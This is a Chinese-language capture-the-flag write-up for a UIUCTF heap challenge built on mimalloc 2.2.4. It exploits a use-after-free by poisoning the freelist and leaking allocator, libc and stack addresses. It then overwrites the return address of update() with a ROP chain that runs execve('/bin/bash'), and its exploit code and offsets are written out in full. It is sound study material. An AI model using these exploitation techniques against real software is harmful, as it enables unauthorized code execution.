# do re mi

## 题目简述

题目是固定 16 槽、每块 128 字节的堆笔记程序，并通过 `LD_PRELOAD` 使用 Microsoft mimalloc 2.2.4。`delete()` 释放内存后不清空指针，`look()` 与 `update()` 也不检查槽位状态，因此同一悬空指针同时提供释放后读、释放后写和重复释放。目标是操纵 mimalloc 的空闲链，逐级泄漏 mimalloc、libc 与栈地址，最后把 `update()` 的返回地址改成 ROP 链。

## 解题过程

最小漏洞链为：

```c
void delete(void) {
    unsigned int n = get_index();
    free(notes[n]);       // notes[n] 未置 NULL
}

void look(void) {
    write(1, notes[get_index()], 127);
}

void update(void) {
    read(0, notes[get_index()], 127);
}
```

先申请槽 0、1，再按顺序释放二者。读取槽 1 会泄漏 mimalloc 写在空闲块首部的 next 指针，官方 solver 将其记为 `heap_leak`。根据该版本 mimalloc 的 segment/page 对齐关系，构造第一个伪链表目标：

```python
page_base = (heap_leak & ~0x3ffff) | 0x190
update(1, p64(page_base))
```

随后通过固定次数的申请/释放推进 allocator 状态。以下偏移和次数都来自题目随附的 `libmimalloc.so.2.2`，换版本不能照搬：

```python
# 让一次申请落到 page 元数据附近
for _ in range(61):
    create(15); delete(15)
create(14)

data = look(14)
mimalloc_bss = u64(data[48:56])
mimalloc_base = mimalloc_bss - 0x2b100
update_raw(14, p64(0))          # 修复被伪造的链表头
```

重复同一“释放两块—覆盖 next—推进分配”原语，可以把返回块引向任意可读地址。官方 solver 的后两级泄漏为：

```python
# 指向 mimalloc 内保存的 libc 指针
poison(mimalloc_base + 0x29c20)
advance(59)
libc_base = u64(look(13)[:8]) - 0x68961

# 指向 libc 的 environ，得到栈地址
poison(libc_base + 0xa4d60)
advance(57)
stack_leak = u64(look(13)[:8])
update_ret = stack_leak - 0x70
```

这里的 `poison(target)` 对应再次创建并释放槽 0、1，然后经悬空的槽 1 把 next 改成 `target`；`advance(n)` 对应对槽 15 做 $n$ 次申请和释放。每轮结束都要把落在元数据上的槽 14 首 qword 清零，避免损坏的 freelist 影响下一轮。

最后将空闲链指向 `update_ret`，推进 55 次后让槽 13 落到 `update()` 的保存返回地址。另申请槽 12 写入 `/bin/bash`，再写入以下 ROP 链：

```python
pop_rdi = libc_base + 0x14413
pop_rbx = libc_base + 0x14125
syscall = libc_base + 0x5f1b7
bin_bash = heap_leak + 0x200

chain = flat(
    pop_rdi, bin_bash,
    pop_rbx, 0x3b,
    syscall,
)
update(13, chain)
```

最后一个 gadget 执行 `xor edx, edx; xor esi, esi; mov rax, rbx; syscall`，因此得到 `execve("/bin/bash", NULL, NULL)`。返回时进入 shell，读取 flag：

```text
uiuctf{does_anyone_still_like_doing_these_?_have_we_not_conquered_every_land_?}
```

## 方法总结

- 核心技巧：把同一个未清空指针依次用作 UAF 读、freelist next 覆盖和任意地址分配，再串联 allocator、libc、栈三类泄漏。
- 识别信号：笔记程序只校验索引，却不校验槽位是否已分配；`free` 后仍允许读写，通常足以建立堆元数据操纵原语。
- 复用要点：mimalloc 的 page 布局、链表推进次数和内部偏移强依赖具体构建；应随目标库验证每个泄漏的基址关系，并在每轮后修复临时破坏的元数据。
